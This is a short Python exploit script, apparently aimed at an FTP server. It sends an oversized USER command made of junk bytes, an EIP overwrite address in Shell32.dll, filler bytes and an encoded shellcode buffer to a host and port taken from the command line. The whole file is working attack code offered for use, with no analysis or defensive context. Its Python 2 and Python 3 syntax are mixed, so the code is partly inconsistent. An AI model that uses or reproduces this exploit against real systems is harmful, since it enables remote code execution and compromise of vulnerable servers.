#!/usr/bin/python

import socket
import sys

junk = b"A" * 230
eip_override = b"\xD7\x30\x9D\x7C" #(7C9D30D7 -- Shell32.dll) (7C86467B -- Kernel32.dll)
NOPS = b"C" * 140

buf =  b""
buf += b"\xda\xcd\xb8\xaa\xaf\x7e\x41\xd9\x74\x24\xf4\x5a\x2b"
buf += b"\xc9\xb1\x31\x31\x42\x18\x83\xea\xfc\x03\x42\xbe\x4d"
buf += b"\x8b\xbd\x56\x13\x74\x3e\xa6\x74\xfc\xdb\x97\xb4\x9a"
buf += b"\xa8\x87\x04\xe8\xfd\x2b\xee\xbc\x15\xb8\x82\x68\x19"
buf += b"\x09\x28\x4f\x14\x8a\x01\xb3\x37\x08\x58\xe0\x97\x31"
buf += b"\x93\xf5\xd6\x76\xce\xf4\x8b\x2f\x84\xab\x3b\x44\xd0"
buf += b"\x77\xb7\x16\xf4\xff\x24\xee\xf7\x2e\xfb\x65\xae\xf0"
buf += b"\xfd\xaa\xda\xb8\xe5\xaf\xe7\x73\x9d\x1b\x93\x85\x77"
buf += b"\x52\x5c\x29\xb6\x5b\xaf\x33\xfe\x5b\x50\x46\xf6\x98"
buf += b"\xed\x51\xcd\xe3\x29\xd7\xd6\x43\xb9\x4f\x33\x72\x6e"
buf += b"\x09\xb0\x78\xdb\x5d\x9e\x9c\xda\xb2\x94\x98\x57\x35"
buf += b"\x7b\x29\x23\x12\x5f\x72\xf7\x3b\xc6\xde\x56\x43\x18"
buf += b"\x81\x07\xe1\x52\x2f\x53\x98\x38\x25\xa2\x2e\x47\x0b"
buf += b"\xa4\x30\x48\x3b\xcd\x01\xc3\xd4\x8a\x9d\x06\x91\x65"
buf += b"\xd4\x0b\xb3\xed\xb1\xd9\x86\x73\x42\x34\xc4\x8d\xc1"
buf += b"\xbd\xb4\x69\xd9\xb7\xb1\x36\x5d\x2b\xcb\x27\x08\x4b"
buf += b"\x78\x47\x19\x28\x1f\xdb\xc1\x81\xba\x5b\x63\xde"

payload = junk + eip_override + NOPS + buf

server_ip = str(sys.argv[1])
server_port = int(sys.argv[2])

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "\nNow sending the malicious payload.\n"
soc.connect((server_ip, server_port))
d = soc.recv(1024)

soc.send('USER someone' + '\r\n')
d = soc.recv(1024)

soc.send('PASS someone' + '\r\n')
d = soc.recv(1024)

soc.send('USER ' + payload + '\r\n')
d = soc.recv(1024)

soc.close()

print "\nDone sending the payload."
